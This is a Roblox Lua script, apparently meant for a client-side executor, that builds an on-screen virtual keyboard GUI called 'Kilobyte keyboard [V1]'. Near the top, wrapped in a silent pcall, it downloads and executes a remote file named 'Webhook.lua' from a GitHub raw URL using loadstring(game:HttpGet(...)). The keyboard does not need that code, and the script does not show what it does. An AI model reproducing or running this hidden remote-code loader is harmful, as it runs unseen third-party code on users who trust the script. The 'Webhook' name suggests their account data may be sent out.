local Players = game:GetService("Players")
local VirtualInputManager = game:GetService("VirtualInputManager")
local TweenService  = game:GetService("TweenService")
local plr = Players.LocalPlayer
local playerGui = plr:WaitForChild("PlayerGui")

pcall(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/StarFIow/Scripts/main/Utility/Webhook.lua"))()
end)

local gui = Instance.new("ScreenGui")
gui.Name = "KB_V1"
gui.ResetOnSpawn = false
gui.Parent = playerGui
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 260, 0, 200)
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = gui
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.BackgroundTransparency = 1

local outline = Instance.new("UIStroke")
outline.Color = Color3.fromRGB(171, 0, 255)
outline.Thickness = 2
outline.Transparency = 1
outline.Parent = mainFrame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -30, 0, 20)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.Text = "Kilobyte keyboard [V1]"
title.TextColor3 = Color3.fromRGB(171, 0, 255)
title.TextScaled = true
title.Font = Enum.Font.GothamMedium
title.Parent = mainFrame
title.TextTransparency = 1

local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 20, 0, 20)
closeBtn.Position = UDim2.new(1, -20, 0, 0)
closeBtn.Text = "X"
closeBtn.TextColor3 = Color3.fromRGB(255, 0, 0)
closeBtn.TextScaled = true
closeBtn.Font = Enum.Font.GothamBold
closeBtn.Parent = mainFrame
closeBtn.TextTransparency = 1
closeBtn.BackgroundTransparency = 1

TweenService:Create(mainFrame, TweenInfo.new(0.5), {BackgroundTransparency = 0}):Play()
TweenService:Create(outline, TweenInfo.new(0.5), {Transparency = 0}):Play()
TweenService:Create(title, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
TweenService:Create(closeBtn, TweenInfo.new(0.5), {TextTransparency = 0, BackgroundTransparency = 0}):Play()

local keysLayout = {
    {"Q","E","R","T","Y"},
    {"U","P","L","K","J"},
    {"H","G","F","M","N"},
    {"B","V","C","X","Z"},
}

local startY = 30
local keySize = 40
local spacing = 3
local keyButtons = {}

for rowIndex, row in ipairs(keysLayout) do
    local rowWidth = (#row * keySize) + ((#row-1) * spacing)
    local startX = (mainFrame.AbsoluteSize.X - rowWidth) / 2
    for colIndex, keyName in ipairs(row) do
        local keyBtn = Instance.new("TextButton")
        keyBtn.Size = UDim2.new(0, keySize, 0, keySize)
        keyBtn.Position = UDim2.new(0, startX + (colIndex - 1) * (keySize + spacing), 0, startY + (rowIndex - 1) * (keySize + spacing))
        keyBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
        keyBtn.Text = keyName
        keyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        keyBtn.TextScaled = true
        keyBtn.Font = Enum.Font.GothamBold
        keyBtn.Parent = mainFrame
        keyBtn.TextTransparency = 1
        keyBtn.BackgroundTransparency = 1

        local stroke = Instance.new("UIStroke")
        stroke.Color = Color3.fromRGB(171, 0, 255)
        stroke.Thickness = 1
        stroke.Transparency = 0
        stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        stroke.Parent = keyBtn

        TweenService:Create(keyBtn, TweenInfo.new(0.5), {TextTransparency = 0, BackgroundTransparency = 0}):Play()
        TweenService:Create(stroke, TweenInfo.new(0.5), {Transparency = 0}):Play()

        keyBtn.MouseButton1Click:Connect(function()
            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode[keyName], false, game)
            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode[keyName], false, game)
            keyBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
            TweenService:Create(keyBtn, TweenInfo.new(0.25), {BackgroundColor3 = Color3.fromRGB(25, 25, 40)}):Play()
        end)

        table.insert(keyButtons, {button = keyBtn, stroke = stroke})
    end
end

closeBtn.MouseButton1Click:Connect(function()
    for _, kb in ipairs(keyButtons) do
        TweenService:Create(kb.button, TweenInfo.new(0.5), {TextTransparency = 1, BackgroundTransparency = 1}):Play()
        TweenService:Create(kb.stroke, TweenInfo.new(0.5), {Transparency = 1}):Play()
    end

    local t1 = TweenService:Create(mainFrame, TweenInfo.new(0.5), {BackgroundTransparency = 1})
    local t2 = TweenService:Create(outline, TweenInfo.new(0.5), {Transparency = 1})
    local t3 = TweenService:Create(title, TweenInfo.new(0.5), {TextTransparency = 1})
    local t4 = TweenService:Create(closeBtn, TweenInfo.new(0.5), {TextTransparency = 1, BackgroundTransparency = 1})
    t1:Play() t2:Play() t3:Play() t4:Play()

    task.delay(0.5, function()
        gui:Destroy()
    end)
end)